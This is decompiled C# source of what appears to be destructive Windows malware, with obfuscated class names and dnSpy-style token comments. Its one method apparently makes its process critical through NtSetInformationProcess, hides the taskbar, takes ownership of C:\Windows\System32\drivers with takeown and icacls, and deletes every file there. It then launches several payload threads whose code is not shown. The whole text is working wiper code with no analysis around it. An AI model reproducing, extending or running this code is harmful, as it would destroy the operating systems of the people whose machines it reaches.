using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

// Token: 0x02000028 RID: 40
public class GClass7
{
	// Token: 0x060000BC RID: 188 RVA: 0x00005C68 File Offset: 0x00003E68
	public void method_0()
	{
		Process.EnterDebugMode();
		GClass2.NtSetInformationProcess(Process.GetCurrentProcess().Handle, GClass2.int_1, ref GClass2.int_0, 4);
		GClass2.SetWindowPos((int)GClass2.FindWindow("Shell_traywnd", ""), 0, 0, 0, 0, 0, 128U);
		GClass8.smethod_0();
		GClass11.smethod_0();
		GClass1.smethod_0("/k takeown /f C:\\Windows\\System32\\drivers && icacls C:\\Windows\\System32\\drivers /grant \"%username%:F\" && exit");
		Thread.Sleep(1000);
		foreach (FileInfo fileInfo in new DirectoryInfo("C:\\Windows\\System32\\drivers").GetFiles())
		{
			try
			{
				File.Delete(fileInfo.FullName);
			}
			catch
			{
			}
		}
		object obj = new GClass0();
		GClass9 gclass = new GClass9();
		GClass12 gclass2 = new GClass12();
		GClass10 gclass3 = new GClass10();
		GClass5 gclass4 = new GClass5();
		GClass4 gclass5 = new GClass4();
		Thread thread = new Thread(new ThreadStart(obj.method_1));
		Thread thread2 = new Thread(new ThreadStart(gclass.method_0));
		Thread thread3 = new Thread(new ThreadStart(gclass2.method_0));
		Thread thread4 = new Thread(new ThreadStart(gclass3.method_0));
		Thread thread5 = new Thread(new ThreadStart(gclass4.method_0));
		new Thread(new ThreadStart(gclass5.method_0)).Start();
		thread3.Start();
		thread4.Start();
		thread.Start();
		thread2.Start();
		thread5.Start();
	}
}
